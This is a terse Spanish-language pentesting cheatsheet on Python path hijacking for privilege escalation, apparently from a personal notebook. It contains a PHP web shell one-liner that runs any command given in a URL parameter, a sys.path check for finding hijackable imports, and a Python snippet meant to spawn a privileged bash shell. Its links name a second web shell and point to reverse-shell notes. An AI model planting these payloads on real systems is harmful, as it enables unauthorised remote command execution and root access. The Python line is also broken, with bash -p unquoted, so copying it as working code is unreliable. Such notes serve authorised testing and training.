---
tipo: cheatsheet
tags: [black-box-testing, bug-bounty, ciberseguridad, command-injection, ctf, cyber-attack, cyber-sec-community, exploit, exploit-development, hacking-etico, hack-the-planet, oscommand-injection, penetration-testing, pentesting, php, privilege-escalation, python, python-hijacking, rce, red-team, reverse-shell, security-research, security-testing, sys-path, vulnerability, webshell, web-shell]
actualizado: 2026-05-28
---

# Python Hijacking — Path Privilege Escalation
---

<?php echo shell_exec($_GET['cmd']); ?>


`python3 -c "import sys; print(sys.path)"`


```python
import os

os.system(bash -p) 
```


---

## Navegación

- ⬆️ Carpeta: [[_4- privilege scalation|4- privilege scalation]]
- ⬅️ Anterior: [[1- privilege scalation basic]]

## Relacionadas

- [[1- privilege scalation basic]] — checklist general y otros vectores.
- [[2- escalada de privilegios]] — notas adicionales de privesc en `2- basico`.
- [[../5- shells/2- tipos de shell|Tipos de shell]] — Web Shell (`<?php system($_GET['cmd']);`) es el vector inicial típico.
- [[../5- shells/1- basic shells|Basic shells]] — comandos rápidos de reverse/bind shell.
- [[_15- Scapy (En desarrollo)|Python/15- Scapy]] — ejemplos avanzados de Python aplicado.
